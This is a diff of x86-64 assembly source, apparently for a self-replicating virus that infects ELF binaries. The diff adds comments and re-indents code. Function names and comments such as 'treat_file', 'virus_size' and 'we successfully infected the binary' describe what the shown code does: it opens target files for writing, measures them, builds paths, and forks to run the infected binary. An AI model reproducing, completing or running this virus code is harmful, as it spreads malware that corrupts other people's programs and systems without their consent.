@@ -8,15 +8,19 @@ section .text
 
 _file_size:
 	enter 24, 0
+; lseek to start of file
 	xor rax, rax
 	mov rax, 8
 	mov rsi, 0
 	mov rdx, 0
 	syscall
+; lseek to end of file
 	mov rax, 8
 	mov rsi, 0
 	mov rdx, 2
 	syscall
+; store the return value, it's the offset of EOF. So it's the file size
+; lseek to start of file again
 	mov QWORD [rsp], rax
 	mov rax, 8
 	mov rsi, 0
@@ -46,26 +50,28 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 ; check if name != NULL
 	cmp rdi, 0
 	je _not_ok_end
-; save virus_size
+; save parameters
 	mov QWORD [rsp + 112], r10
 	mov QWORD [rsp + 8], rsi
 	mov QWORD [rsp + 64], rdi
 	mov QWORD [rsp + 72], rdx
+
+; take len of arguments
 	mov rdi, QWORD [rsp + 64]
-_lab_strlen_1:
 	call _ft_strlen
 	mov QWORD [rsp + 80], rax
 	mov rdi, QWORD [rsp + 72]
-_lab_strlen_2:
 	call _ft_strlen
 	mov QWORD [rsp + 88], rax
+
+; calcul total len
 	mov r10, rsp
-	add r10, 96
-	mov r11, QWORD [rsp + 80]
-	mov QWORD [r10], r11
-	mov r11, QWORD [rsp + 88]
-	add QWORD [r10], r11
-	add QWORD [r10], 2
+	add r10, 96 ; total len addr on stack
+	mov r11, QWORD [rsp + 80] ; take first len
+	mov QWORD [r10], r11 ; mov it to our variable
+	mov r11, QWORD [rsp + 88] ; take second len
+	add QWORD [r10], r11 ; add it to our variable
+	add QWORD [r10], 2 ; add 2 for the / and \0
 ; path
 	mov rdi, rsp
 	sub rdi, QWORD [rsp + 96]
@@ -94,28 +100,27 @@ _lab_strlen_2:
 ; open file
 	mov rdi, rsp
 	sub rdi, QWORD [rsp + 96]
-_lab_test:
 	mov rax, 2
 	mov rsi, 2
 	xor rdx, rdx
-	mov r10, QWORD [rsp + 96]
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
+		mov r10, QWORD [rsp + 96]
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	syscall
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
 	cmp rax, -1
 	jle _not_ok_end
 	mov QWORD [rsp], rax ; store the fd
 	mov rdi, rax
-	mov r10, QWORD [rsp + 96]
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
+		mov r10, QWORD [rsp + 96]
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	call _file_size
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
 	mov QWORD [rsp + 16], rax ; store file size
 	lea r10, [rel _not_ok_end]
 	mov QWORD [rsp + 104], r10
@@ -266,20 +271,21 @@ _close_file:
 	mov rax, QWORD [rsp + 104]
 	jmp rax
 
+; Here we need we successfully infected the binary, so we will check if we need to run him or not
 _ok_end:
-	cmp QWORD [rsp + 112], 1
-	jne _not_ok_end
-	mov r10, QWORD [rsp + 96]
-	mov rdi, QWORD [rsp + 64]
-	mov rsi, QWORD [rsp + 72]
+	cmp QWORD [rsp + 112], 1 ; check if fork mode is activated
+	jne _not_ok_end ; if not, we return.
+	mov r10, QWORD [rsp + 96] ; take total len
+	mov rdi, QWORD [rsp + 64] ; take name addr
+	mov rsi, QWORD [rsp + 72] ; take full path addr
 	mov rdx, rsp
-	sub rdx, r10
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
-	call _thread_create
-	add rsp, QWORD [rsp]
+	sub rdx, r10 ; take full concatened path addr
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
+	call _thread_create ; fork to exec this infected binary
+		add rsp, QWORD [rsp]
 	mov rax, 1
 	jmp _final_end
 
